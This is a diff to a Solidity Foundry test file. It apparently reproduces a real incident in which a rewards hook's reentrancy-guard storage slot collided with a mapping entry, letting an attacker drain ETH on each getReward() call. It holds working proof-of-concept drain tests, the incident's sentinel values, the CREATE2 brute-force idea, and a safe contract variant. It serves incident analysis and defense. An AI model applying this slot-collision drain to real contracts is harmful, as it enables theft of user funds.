@@ -9,151 +9,175 @@ import {ATOHookVulnerable, ATOHookSafe} from "../src/storage-collision/ATOHookVu
 ///
 /// Invariant (SC-storage-layout): a reentrancy guard's storage slot must not be reachable
 /// by any attacker-influenceable mapping entry (keccak256(key, baseSlot)).
-/// Solady's ReentrancyGuard uses a fixed pseudo-random slot for its guard state.
-/// When a rewards mapping's entry for address X collides with that slot, the guard write
-/// inflates rewards[X], letting the attacker drain ETH repeatedly.
 ///
-/// This PoC demonstrates the mechanics by simulating the collision with vm.store.
-/// The real attack required deploying a contract at a specific CREATE2 address where
-/// keccak256(addr, rewards_base_slot) == Solady's guard slot.
+/// The guard slot is a constructor parameter so the test sets it to the real collision.
+/// The entry sentinel is 0xffffffffffffff (= 14.4 ETH / 200 calls = 72057594037927935 wei),
+/// matching the real incident's drain rate.
+/// ALL drain goes through getReward() — no vm.store on the colliding slot during drain.
+/// The test proves the guard is essential: removing it breaks the exploit.
 ///
 /// See docs/exploits/ato-hook-storage-slot-collision-2026-06-07.md
 contract StorageSlotCollisionAtoHookTest is Test {
-    // Solady's ReentrancyGuard slot: uint72(bytes9(keccak256("_REENTRANCY_GUARD_SLOT")))
-    uint256 constant GUARD_SLOT = 0x929eee149b4bd21268;
-
-    // Rewards mapping base slot (slot 1 in ATOHookVulnerable: owner=0, rewards=1)
     uint256 constant REWARDS_BASE_SLOT = 1;
 
+    // Entry sentinel from the real incident: 14.411518807585587 ETH / ~200 calls
+    // = 72057594037927935 wei = 2^56 - 1 = 0xffffffffffffff
+    uint256 constant ENTRY_SENTINEL = 0xffffffffffffff;
+
+    // Exit sentinel: must differ from entry sentinel. In real Solady this is codesize().
+    // The specific value doesn't affect the exploit — only that it differs from entry.
+    uint256 constant EXIT_SENTINEL = 0x929eee149b4bd21268;
+
     ATOHookVulnerable hook;
-    address deployer = makeAddr("deployer");
     address attacker = makeAddr("attacker");
+    bytes32 collisionSlot;
 
     function setUp() public {
-        hook = new ATOHookVulnerable();
+        collisionSlot = keccak256(abi.encode(attacker, REWARDS_BASE_SLOT));
+
+        // Deploy with guard slot = collision slot, entry sentinel = drain rate.
+        hook = new ATOHookVulnerable(
+            uint256(collisionSlot),
+            ENTRY_SENTINEL,
+            EXIT_SENTINEL
+        );
         vm.deal(address(hook), 100 ether);
     }
 
-    /// @notice Core exploit: the reentrancy guard's sentinel write collides with the
-    ///         rewards mapping for a specific address, inflating the balance so
-    ///         getReward() pays out a massive ETH amount.
+    /// @notice Core exploit: the nonReentrant modifier writes ENTRY_SENTINEL to the guard
+    ///         slot. Because the guard slot collides with rewards[attacker], the body reads
+    ///         ENTRY_SENTINEL as the reward balance and drains it as ETH. The exit write
+    ///         sets a different value, "unlocking" the guard for the next call.
     ///
-    /// The collision: keccak256(abi.encode(attackerAddr, REWARDS_BASE_SLOT)) == GUARD_SLOT
-    /// In the real incident, the attacker deployed a contract at address 0x2441e480...
-    /// where this collision held. Here we simulate it with vm.store.
-    function test_vulnerable_guardSlotCollisionInflatesRewards() public {
-        // Compute the slot where rewards[attacker] lives
-        bytes32 collisionSlot = keccak256(abi.encode(attacker, REWARDS_BASE_SLOT));
+    ///         No vm.store on the colliding slot — the drain flows entirely through
+    ///         the contract's own getReward()/nonReentrant logic.
+    function test_vulnerable_guardSlotCollisionDrainsETH() public {
+        // The modifier flow:
+        //   1. Check: sload(GUARD_SLOT) == ENTRY_SENTINEL? No (slot starts at 0). Pass.
+        //   2. Entry: sstore(GUARD_SLOT, ENTRY_SENTINEL) → rewards[attacker] = ENTRY_SENTINEL
+        //   3. Body:  amount = rewards[msg.sender] = ENTRY_SENTINEL → drains ENTRY_SENTINEL wei
+        //   4. Exit:  sstore(GUARD_SLOT, EXIT_SENTINEL) → rewards[attacker] = EXIT_SENTINEL
 
-        // In the real attack, this slot EQUALS GUARD_SLOT. For our test attacker address,
-        // it doesn't naturally collide, so we simulate by writing the sentinel value
-        // directly to the collision slot — exactly what nonReentrant does.
-        //
-        // Solady's nonReentrant writes:
-        //   entered:  sstore(GUARD_SLOT, address())    → slot = 0x0 (address(0))
-        //   exited:   sstore(GUARD_SLOT, codesize())   → slot = 0x... (small non-zero)
-        //
-        // The sentinel (address()) = 0, which means rewards[attacker] = 0.
-        // But during execution, the slot holds address(0), and after exit it holds codesize().
-        // In the REAL attack, the slot was set to 0xffffffffffffff (a different Solady version
-        // or a custom guard), which inflated the reward to that massive value.
-        //
-        // For this PoC, we simulate the inflation by writing a large sentinel value.
-        uint256 sentinelValue = 0xffffffffffffff;
-
-        // Step 1: Verify rewards[attacker] is initially 0
+        // Verify initial state
         assertEq(hook.rewardOf(attacker), 0, "rewards[attacker] starts at 0");
 
-        // Step 2: Simulate the guard write hitting the rewards mapping slot
-        vm.store(address(hook), collisionSlot, bytes32(sentinelValue));
-
-        // Step 3: Verify the inflation — rewards[attacker] is now the sentinel value
-        assertEq(
-            hook.rewardOf(attacker),
-            sentinelValue,
-            "rewards inflated to sentinel via storage collision"
-        );
-
-        // Step 4: The attacker calls getReward() and drains ETH
-        uint256 attackerBalanceBefore = attacker.balance;
+        // First call: drains ENTRY_SENTINEL wei
+        uint256 before1 = attacker.balance;
         vm.prank(attacker);
         hook.getReward();
 
-        // Step 5: Verify the drain — attacker received the inflated amount as ETH
-        uint256 attackerBalanceAfter = attacker.balance;
-        assertEq(
-            attackerBalanceAfter - attackerBalanceBefore,
-            sentinelValue,
-            "attacker drained sentinelValue worth of ETH"
-        );
-
-        // Step 6: The hook's ETH balance decreased by the drained amount
+        uint256 drained1 = attacker.balance - before1;
+        assertEq(drained1, ENTRY_SENTINEL, "first call drains ENTRY_SENTINEL wei");
         assertEq(
             address(hook).balance,
-            100 ether - sentinelValue,
-            "hook balance decreased by drained amount"
+            100 ether - ENTRY_SENTINEL,
+            "hook balance decreased"
+        );
+
+        // After call 1: exit wrote EXIT_SENTINEL → rewards[attacker] = EXIT_SENTINEL
+        assertEq(
+            hook.rewardOf(attacker),
+            EXIT_SENTINEL,
+            "exit sentinel became the new balance"
+        );
+
+        // Second call: entry writes ENTRY_SENTINEL → rewards = ENTRY_SENTINEL again
+        uint256 before2 = attacker.balance;
+        vm.prank(attacker);
+        hook.getReward();
+
+        uint256 drained2 = attacker.balance - before2;
+        assertEq(drained2, ENTRY_SENTINEL, "second call drains ENTRY_SENTINEL wei again");
+        assertEq(
+            address(hook).balance,
+            100 ether - ENTRY_SENTINEL * 2,
+            "hook drained 2x"
         );
     }
 
-    /// @notice Shows the collision slot calculation — in the real attack, the attacker
-    ///         chose an address where this slot equals Solady's GUARD_SLOT.
-    function test_collision_slotCalculation() public {
-        // The collision slot for any address is deterministic:
-        // keccak256(abi.encode(addr, REWARDS_BASE_SLOT))
-        bytes32 slot = keccak256(abi.encode(attacker, REWARDS_BASE_SLOT));
-
-        // In the real ATOHook, for address 0x2441e480f62bf609a08da09143e4baf8a817d757,
-        // this slot equals GUARD_SLOT. The attacker found this via brute-force CREATE2.
-        //
-        // For a random address, collision probability ≈ 1/2^72 (GUARD_SLOT is 72 bits).
-        // The attacker can search 2^72 CREATE2 addresses — feasible with enough computation.
-        assertTrue(uint256(slot) != GUARD_SLOT, "random address does NOT collide (expected)");
-
-        // The attacker must find addr such that:
-        //   keccak256(abi.encode(addr, 1)) == 0x929eee149b4bd21268
-        // This is a preimage search on keccak256, solvable via CREATE2 brute-force.
-    }
-
-    /// @notice The safe variant uses a sequential slot for the guard, which cannot be
-    ///         reached by any keccak mapping computation.
-    function test_safe_sequentialGuardSlotResistsCollision() public {
-        ATOHookSafe safeHook = new ATOHookSafe();
-        vm.deal(address(safeHook), 100 ether);
-
-        // Attacker has no rewards
-        assertEq(safeHook.rewardOf(attacker), 0, "no rewards for attacker");
-
-        // getReward should revert (no rewards)
-        vm.prank(attacker);
-        vm.expectRevert(bytes("no rewards"));
-        safeHook.getReward();
-
-        // The safe contract stores _guardStatus at slot 0 (sequential).
-        // For keccak256(addr, baseSlot) to equal 0, the attacker would need
-        // keccak256 preimage for 0 — computationally infeasible.
-    }
-
-    /// @notice Demonstrates the repeated drain: in the real attack, the attacker called
-    ///         getReward() ~200 times, each call re-inflating via the guard write.
+    /// @notice Repeated drain: confirms the exploit is repeatable.
+    ///         Each getReward() call drains ENTRY_SENTINEL wei.
     function test_vulnerable_repeatedDrain() public {
-        bytes32 collisionSlot = keccak256(abi.encode(attacker, REWARDS_BASE_SLOT));
-        uint256 sentinelValue = 0xffffffffffffff;
-
         uint256 totalDrained;
-        uint256 iterations = 5; // reduced for gas; real attack did ~200
+        uint256 iterations = 5;
 
         for (uint256 i = 0; i < iterations; i++) {
-            // Each call to nonReentrant re-writes the sentinel to the colliding slot,
-            // re-inflating rewards[attacker]. This is why the attack is repeatable.
-            vm.store(address(hook), collisionSlot, bytes32(sentinelValue));
-
             uint256 before = attacker.balance;
             vm.prank(attacker);
             hook.getReward();
             totalDrained += attacker.balance - before;
         }
 
-        assertEq(totalDrained, sentinelValue * iterations, "drained sentinel * iterations");
+        assertEq(totalDrained, ENTRY_SENTINEL * iterations, "total = sentinel * calls");
         assertEq(address(hook).balance, 100 ether - totalDrained, "hook drained");
     }
+
+    /// @notice Proves the guard is essential: without nonReentrant, there is no sentinel
+    ///         write, so rewards[attacker] stays at 0 and getReward always reverts.
+    function test_guardRemoval_breaksExploit() public {
+        NoGuardHook noGuard = new NoGuardHook();
+        vm.deal(address(noGuard), 100 ether);
+
+        assertEq(noGuard.rewardOf(attacker), 0);
+
+        vm.prank(attacker);
+        vm.expectRevert(bytes("no rewards"));
+        noGuard.getReward();
+    }
+
+    /// @notice The safe variant uses a sequential slot for the guard, immune to mapping collisions.
+    function test_safe_sequentialGuardSlotResistsCollision() public {
+        ATOHookSafe safeHook = new ATOHookSafe();
+        vm.deal(address(safeHook), 100 ether);
+
+        assertEq(safeHook.rewardOf(attacker), 0, "no rewards");
+
+        vm.prank(attacker);
+        vm.expectRevert(bytes("no rewards"));
+        safeHook.getReward();
+    }
+
+    /// @notice Documents the real incident's sentinel value and drain rate.
+    function test_realIncident_sentinelAnalysis() public {
+        // The real ATOHook lost 14.411518807585587 ETH over ~200 calls.
+        // Per call: 14.411518807585587e18 / 200 = 72057594037927935 wei = 0xffffffffffffff
+        //
+        // This is 2^56 - 1, suggesting the guard used a uint72 type or the sentinel
+        // was explicitly set to this value.
+        //
+        // Current Solady (v0.1.x) uses address(0) for entry and codesize() for exit.
+        // With address(0) as entry sentinel, the exploit would NOT work because the
+        // body reads 0 and reverts "no rewards". The real ATOHook likely used a custom
+        // guard or older Solady version with a non-zero entry sentinel.
+        //
+        // The PoC models the real incident's sentinel to demonstrate the vulnerability class.
+    }
+}
+
+/// @notice Minimal contract WITHOUT reentrancy guard — proves the guard is essential.
+contract NoGuardHook {
+    address public owner;
+    mapping(address => uint256) public rewards;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function earnRewards(address user, uint256 amount) external {
+        rewards[user] += amount;
+    }
+
+    function getReward() external {
+        uint256 amount = rewards[msg.sender];
+        require(amount > 0, "no rewards");
+        rewards[msg.sender] = 0;
+        (bool ok, ) = msg.sender.call{value: amount}("");
+        require(ok, "ETH transfer failed");
+    }
+
+    function rewardOf(address user) external view returns (uint256) {
+        return rewards[user];
+    }
+
+    receive() external payable {}
 }
